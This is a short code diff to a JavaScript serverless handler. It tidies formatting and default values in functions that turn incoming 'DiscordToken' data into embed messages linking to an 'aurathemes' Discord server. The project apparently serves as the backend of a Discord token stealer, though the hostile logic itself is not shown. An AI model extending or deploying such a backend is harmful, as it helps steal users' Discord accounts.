@@ -29,7 +29,6 @@ export default async function handler(req, res) {
     });
 
     const info = await response.json();
-
     console.log(info);
 
     const Discord = new DiscordToken(data).info;
@@ -50,9 +49,7 @@ export default async function handler(req, res) {
   }
 }
 
-function getField(name = null, value = null, inline = false) {
-  name = name && name.length > 0 ? name : '-';
-  value = value && value.length > 0 ? value : '-';
+function getField(name = '-', value = '-', inline = false) {
   return { name, value, inline };
 }
 
@@ -86,10 +83,10 @@ function buildInitializedEmbed(Discord, data, embed) {
 
 async function getEmbed() {
   const embed = {
-    avatar_url: "https://i.imgur.com/WkKXZSl.gif",
-    discord: "https://discord.gg/aurathemes",
-    footer_url: "https://i.imgur.com/WkKXZSl.gif"
-  }
+    avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
+    discord: 'https://discord.gg/aurathemes',
+    footer_url: 'https://i.imgur.com/WkKXZSl.gif',
+  };
 
   return {
     avatar: embed.avatar_url,
